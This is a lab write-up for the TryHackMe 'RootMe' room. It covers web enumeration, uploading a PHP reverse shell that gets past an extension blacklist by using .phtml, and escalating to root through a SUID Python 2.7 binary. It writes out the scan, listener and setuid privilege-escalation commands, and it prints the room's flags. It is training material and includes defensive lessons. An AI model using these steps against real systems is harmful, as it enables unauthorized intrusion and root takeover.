# 🐚 TryHackMe CTF Write-up — RootMe

---

## 🧭 Overview

**RootMe** is a beginner-friendly TryHackMe room that demonstrates a classic web exploitation and privilege escalation attack chain.

The challenge covers:

* 🔎 Service enumeration
* 📂 Directory brute-forcing
* 📤 File upload filter bypass
* 💻 Remote Code Execution (RCE)
* 🔄 PHP reverse shell
* ⬆️ SUID-based privilege escalation

The tagline says it all:

> **"Can you root me?"**

---

## 🔎 Reconnaissance — Nmap Port Scan

I started with a full TCP port scan combined with service and version detection:

```bash
nmap -p- -A -Pn -n 10.130.132.40
```

Two open TCP ports were identified:

| Port | Service | Version             |
| ---- | ------- | ------------------- |
| `22` | SSH     | OpenSSH 8.2p1       |
| `80` | HTTP    | Apache httpd 2.4.41 |

The HTTP service was the most promising entry point since no SSH credentials were available.

One additional finding from the scan was that the `PHPSESSID` cookie was served without the `HttpOnly` flag.


<img width="575" height="194" alt="image" src="https://github.com/user-attachments/assets/3d941511-6b9f-4d43-839b-78455156aaa6" />

---

## 🌐 Web Enumeration

### 🏠 Landing Page

Navigating to:

```text
http://10.130.132.40/
```

revealed a minimal webpage containing:

```text
root@rootme:~#
```

along with the challenge tagline:

> **"Can you root me?"**

There was no obvious login functionality or useful link, so I moved on to directory enumeration.


<img width="1114" height="624" alt="image" src="https://github.com/user-attachments/assets/0557fbdd-db06-469c-a881-5a6c2a6beb5c" />

---

### 📂 Directory Brute-Force with Gobuster

I used Gobuster to discover hidden directories:

```bash
gobuster dir -u http://10.130.132.40 \
-w /usr/share/wordlists/dirb/common.txt \
-b 404,403
```

Several paths were discovered, with two being particularly interesting:

```text
/panel
/uploads
```

`/panel` appeared to be an upload endpoint, while `/uploads` appeared to be the directory where uploaded files were stored.


<img width="1114" height="624" alt="image" src="https://github.com/user-attachments/assets/0006a558-57be-48e0-8e67-282edfd27866" />

---

## 📤 File Upload Panel — Initial Access

Navigating to:

```text
http://10.130.132.40/panel/
```

revealed a simple file upload form.

The objective was to upload a PHP reverse shell and execute it through the `/uploads` directory.


<img width="552" height="336" alt="image" src="https://github.com/user-attachments/assets/ae85d01f-2e04-4e31-ac9b-4104a3864c0e" />

---

## 🐚 Generating the PHP Reverse Shell

I generated a PHP reverse shell using **revshells.com**.

The **PHP PentestMonkey** template was selected, with the attacker IP and listener port configured accordingly.

The generated payload was saved locally as:

```text
rootme.php
```


<img width="450" height="293" alt="image" src="https://github.com/user-attachments/assets/7ce0bcfb-dccb-4881-8c59-606efb60aa85" />

---

## 🧩 File Upload Filter Bypass

### ❌ PHP Extension Blocked

Attempting to upload:

```text
rootme.php
```

was rejected by the server.

The application returned:

> `PHP não é permitido!`

This indicated that the application was blocking the `.php` extension.


<img width="368" height="206" alt="image" src="https://github.com/user-attachments/assets/7b8d6a8f-0078-4d85-9506-8b369c64ca7d" />

---

### ✅ Bypass Using `.phtml`

Instead of using the blocked `.php` extension, I renamed the file to:

```text
rootme.phtml
```

I intercepted the upload request using **Burp Suite** and modified the filename before forwarding it to the server.

The upload was accepted successfully:

> `O arquivo foi upado com sucesso!`


<img width="370" height="238" alt="image" src="https://github.com/user-attachments/assets/a820d973-aa17-4ca7-9426-70acf2b6682a" />

This worked because the blacklist only blocked the `.php` extension while allowing another PHP-executable extension.

---

## 🔄 Triggering the Reverse Shell

I started a Netcat listener on port `4444`:

```bash
nc -lvnp 4444
```

Then I triggered the uploaded payload by navigating to:

```text
http://10.130.132.40/uploads/rootme.phtml
```

The reverse shell connected successfully.

The shell was running as:

```text
www-data
```

I then searched for the user flag:

```bash
find / -name user.txt 2>/dev/null
```

The flag was located at:

```text
/var/www/user.txt
```

and retrieved with:

```bash
cat /var/www/user.txt
```


<img width="719" height="371" alt="image" src="https://github.com/user-attachments/assets/470d53dc-c340-427d-bfa3-6eca793c74d0" />

### 🚩 User Flag

```text
THM{y0u_g0t_a_sh3ll}
```

---

## ⬆️ Privilege Escalation — SUID Enumeration

After obtaining a shell as `www-data`, the next objective was to escalate privileges to `root`.

I searched for SUID binaries using:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Several normal system binaries were returned, including:

```text
sudo
passwd
newgrp
```

However, one binary immediately stood out:

```text
/usr/bin/python2.7
```

A SUID-enabled Python interpreter is highly dangerous because it can be abused to execute commands with elevated privileges.


<img width="647" height="403" alt="image" src="https://github.com/user-attachments/assets/557b3a1a-4e8c-4142-8c5b-891de4ce2140" />

---

## 🧨 GTFOBins — Python SUID Exploitation

I checked **GTFOBins** for known SUID abuse techniques involving Python.

The relevant technique allows a shell to be spawned while preserving the elevated privileges inherited from the SUID binary.

The Python SUID technique can be represented as:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Since the target was using Python 2.7, I used:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

The important part is setting the UID to `0`, which corresponds to `root`.


<img width="671" height="362" alt="image" src="https://github.com/user-attachments/assets/da72a42f-e340-4510-b555-6ceff0f2a057" />

---

## 👑 Root Shell

Before escalating, I spawned a proper interactive TTY:

```bash
python2.7 -c 'import pty; pty.spawn("/bin/bash")'
```

I then executed the SUID Python binary:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Running:

```bash
id
```

confirmed that the shell was running as root:

```text
uid=0(root)
```

I then searched for the root flag:

```bash
find / -name root.txt 2>/dev/null
```

The flag was located at:

```text
/root/root.txt
```

and retrieved using:

```bash
cat /root/root.txt
```


<img width="452" height="210" alt="image" src="https://github.com/user-attachments/assets/7174e55b-81f6-4076-8709-84e887755bdb" />

---

## 🚩 Flags

### User Flag

```text
THM{y0u_g0t_a_sh3ll}
```

### Root Flag

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 📊 Challenge Information

| Information      | Result               |
| ---------------- | -------------------- |
| Open Ports       | `2`                  |
| SSH Port         | `22`                 |
| HTTP Port        | `80`                 |
| SSH Service      | `OpenSSH`            |
| Apache Version   | `2.4.41`             |
| Hidden Directory | `/panel/`            |
| Upload Directory | `/uploads/`          |
| Initial User     | `www-data`           |
| SUID Binary      | `/usr/bin/python2.7` |
| Final Privilege  | `root`               |

---

## 🛠️ Tools & Techniques

| Tool              | Purpose                                       |
| ----------------- | --------------------------------------------- |
| **Nmap**          | Port scanning and service enumeration         |
| **Gobuster**      | Directory brute-forcing                       |
| **Burp Suite**    | Intercepting and modifying the upload request |
| **revshells.com** | Generating the PHP reverse shell              |
| **Netcat**        | Receiving the reverse shell                   |
| **find**          | Locating flags and SUID binaries              |
| **GTFOBins**      | SUID privilege escalation reference           |
| **Python 2.7**    | TTY spawning and privilege escalation         |

---

## 🧠 Key Takeaways

### 1. Directory Enumeration Matters

Directory enumeration is often one of the first steps during web application testing.

Without Gobuster, the `/panel/` upload functionality could easily have been missed.

### 2. Blacklist-Based Upload Filters Are Weak

Blocking only `.php` is insufficient.

A better approach is to use a strict **allowlist** of permitted file extensions and validate both the file type and server-side execution behavior.

### 3. SUID on Powerful Interpreters Is Dangerous

Setting the SUID bit on interpreters such as Python can provide a straightforward path to root privileges.

System administrators should avoid granting SUID permissions to scripting or programming language interpreters.

### 4. GTFOBins Is Extremely Useful

**GTFOBins** is an excellent reference when encountering unusual binaries during Linux privilege escalation.

When an unexpected SUID binary appears, checking whether it has a known abuse technique can quickly reveal an escalation path.

### 5. Get a Proper TTY

After obtaining a raw reverse shell, spawning a proper TTY can make the session significantly more usable:

```bash
python2.7 -c 'import pty; pty.spawn("/bin/bash")'
```

This provides better interaction and job-control capabilities compared with a basic reverse shell.

---

## 🏁 Conclusion

The attack chain was:

```text
Nmap
  ↓
Web Enumeration
  ↓
Gobuster
  ↓
/panel/
  ↓
File Upload
  ↓
.phtml Filter Bypass
  ↓
PHP Reverse Shell
  ↓
www-data
  ↓
SUID Enumeration
  ↓
Python 2.7
  ↓
Privilege Escalation
  ↓
root 👑
```

**Rooted! 🐚👑**
